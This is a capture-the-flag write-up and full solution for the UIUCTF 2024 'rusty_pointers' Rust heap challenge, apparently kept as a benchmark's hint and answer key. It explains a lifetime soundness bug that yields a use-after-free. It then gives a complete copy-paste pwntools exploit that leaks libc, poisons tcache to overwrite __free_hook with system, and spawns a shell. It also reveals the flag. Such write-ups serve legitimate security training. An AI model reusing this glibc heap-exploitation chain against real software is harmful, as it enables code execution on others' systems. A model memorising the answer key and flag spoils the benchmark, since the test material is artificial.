# uiuctf_2024_rusty_pointers Hint

## Overview

This is a heap exploitation challenge written in Rust that abuses a known compiler soundness bug related to higher-ranked trait bounds (HRTBs). The binary implements a "train schedule management" system with Rules (dangling references) and Notes (owned boxes), both backed by 64-byte heap allocations. A separate "Make a Law" feature allocates and frees a large (2000-byte) buffer, providing a heap leak. The goal is to exploit the use-after-free primitive to achieve arbitrary code execution and read the flag.

## Recon

- The binary is a dynamically linked, PIE-enabled ELF64 compiled from Rust. It uses glibc 2.31 (Ubuntu 20.04 tcache behavior).
- Source code (main.rs) is provided. The critical function is `get_ptr`, which uses a lifetime manipulation trick involving higher-ranked trait bounds to return a mutable reference that outlives the Box it was derived from.
- When `get_rule()` is called, it allocates a Box on the heap, obtains a dangling reference to its contents via `get_ptr`, then the Box is dropped at function return. The returned reference now points to freed heap memory.
- Notes, by contrast, return an owned `Box<[u8; 64]>` that remains valid.
- The "Make a Law" option (menu choice 5) allocates two 2000-byte buffers, frees the first, then calls `get_law()` which allocates a 2000-byte buffer into the freed slot and leaks its first 16 bytes as hex values. This provides a heap/libc leak from tcache or unsorted bin metadata.

## Reversing Strategy

1. **Identify the UAF primitive**: The `get_ptr` function exploits Rust issue #25860 (variance in higher-ranked subtyping). It coerces a short-lived `&'a mut T` into a `&'static mut T` by abusing a function pointer cast with a static `&&()` reference. After the owning Box drops, the returned reference is dangling.

2. **Understand allocation sizes**: Rules and Notes both allocate 64-byte buffers (fitting in the 0x50 tcache bin with glibc metadata overhead). The "Make a Law" feature uses 2000-byte allocations (large enough for unsorted bin if tcache is full, or a different tcache bin).

3. **Trace heap state through operations**: Creating a Rule gives a dangling pointer to a freed 0x50 chunk. Creating a Note allocates a live 0x50 chunk. If a Note is allocated after a Rule, it may reuse the same freed chunk, creating an overlap where the Rule's dangling reference and the Note's Box point to the same memory.

4. **Identify read/write primitives**: Reading a Rule via option 3 reads 64 bytes from the dangling pointer (heap leak). Editing a Rule via option 4 writes up to 64 bytes to the dangling pointer (write to freed/reused chunk). These provide read and write access to tcache free list pointers.

## Solve Path

1. **Obtain a heap leak**: Use the "Make a Law" feature (option 5) to leak heap metadata. The two 2000-byte allocations go into the unsorted bin or large tcache bins. After freeing and reallocating, the leaked values reveal heap base or libc pointers depending on bin state.

2. **Obtain a libc leak**: Create overlapping Rule/Note allocations such that a Rule's dangling reference overlaps with freed tcache metadata containing a libc pointer (from unsorted bin linkage). Read the Rule to leak libc base.

3. **Tcache poisoning for arbitrary write**: Create a Rule (dangling reference to freed 0x50 chunk). Edit the Rule to overwrite the tcache fd pointer in the freed chunk with a target address (e.g., __free_hook, __malloc_hook, or a return address). Account for the tcache fd pointer protection (safe-linking) if applicable to the glibc version. For glibc 2.31, safe-linking is NOT present, so raw pointer overwrite works.

4. **Trigger allocation at target and overwrite**: Allocate Notes to consume tcache entries until the poisoned entry is returned, giving a write primitive at the target address. Write a one-gadget or system address to hijack control flow.

5. **Get shell or read flag**: With control flow hijacked (e.g., __free_hook overwritten with system), trigger the hook by freeing a chunk whose contents are "/bin/sh", then read the flag from the spawned shell.

## Common Mistakes

- Not recognizing that glibc 2.31 lacks safe-linking (introduced in 2.32), so tcache fd pointers are plain addresses.
- Confusing Rules (dangling references/UAF) with Notes (live allocations). The UAF only applies to Rules.
- Failing to account for the 2000-byte allocation sizes in "Make a Law" being in a different size class than the 64-byte Rule/Note allocations.
- Not properly sequencing allocations to ensure Rule dangling pointers overlap with the desired tcache metadata.

# uiuctf_2024_rusty_pointers Full Exploit

This challenge is a heap UAF caused by Rust lifetime unsoundness in `get_ptr()`. The practical route is:

1. Use `Make a Law` to leak a `main_arena` pointer from the unsorted bin.
2. Fill the `0x50` tcache bin with freed `Note` chunks.
3. Create one `Rule`, which reuses a freed `Note` chunk and leaves a dangling writable pointer to it.
4. Overwrite that freed chunk's `fd` pointer with `__free_hook`.
5. Allocate two `Note`s so the second lands on `__free_hook`, write `system` there, then free a `Note` containing `/bin/sh`.

The libc leak offset for the provided `libc-2.31.so` is `0x1ecbe0`.
## Local setup
Run (At bash or commands terminals) the provided Docker service on a free local port:
cd /root/nicholas/Rev-bench-linux-x64
docker build -t rusty-pointers-local binaries/ctf-pwn/uiuctf_2024_rusty_pointers/server
docker rm -f rusty-pointers-test >/dev/null 2>&1 || true
docker run -d --name rusty-pointers-test -p 31341:1337 rusty-pointers-local

## Exploit

Copy-paste this exactly from the repo root:

```python
#!/usr/bin/env python3
from pwn import *

HOST = "127.0.0.1"
PORT = 31341

libc = ELF("binaries/ctf-pwn/uiuctf_2024_rusty_pointers/libc-2.31.so")
io = remote(HOST, PORT)

def create_rule():
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"1")

def create_note():
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", b"2")

def delete_note(idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(idx).encode())

def edit_rule(idx, data):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"> ", str(idx).encode())
    io.sendafter(b"> ", data.ljust(64, b"\x00"))

def edit_note(idx, data):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"> ", str(idx).encode())
    io.sendafter(b"> ", data.ljust(64, b"\x00"))

def make_law():
    io.sendlineafter(b"> ", b"5")
    return int(io.recvuntil(b",", drop=True), 16)

libc_leak = make_law()
libc.address = libc_leak - 0x1ecbe0
free_hook = libc.sym["__free_hook"]
system = libc.sym["system"]

log.info(f"libc leak   = {hex(libc_leak)}")
log.info(f"libc base   = {hex(libc.address)}")
log.info(f"__free_hook = {hex(free_hook)}")
log.info(f"system      = {hex(system)}")

# Prime tcache[0x50] with free Note chunks.
for _ in range(4):
    create_note()
delete_note(3)
delete_note(2)
delete_note(1)
delete_note(0)

# Rule now reuses a freed Note chunk and leaves a dangling pointer to it.
create_rule()
edit_rule(0, p64(free_hook))

# First Note takes the poisoned chunk, second lands on __free_hook.
create_note()
create_note()
edit_note(1, p64(system))

# Freeing this Note becomes system("/bin/sh").
edit_note(0, b"/bin/sh\x00")
delete_note(0)

io.sendline(b"cat flag.txt")
io.interactive()
```

Run it with:

```bash
python3 exploit.py
```

Expected output includes:

```text
uiuctf{who_knew_if_my_pointers_lived_forever_they_would_rust???}
```

## Why the original approach failed

Using only one freed chunk before creating the `Rule` is unreliable here because the tcache state does not line up so that the second `Note` allocation reaches `__free_hook`. Filling the bin with several freed `Note`s first makes the `Rule` overlap a real tcache entry, so poisoning its `fd` gives a stable allocation path to `__free_hook`.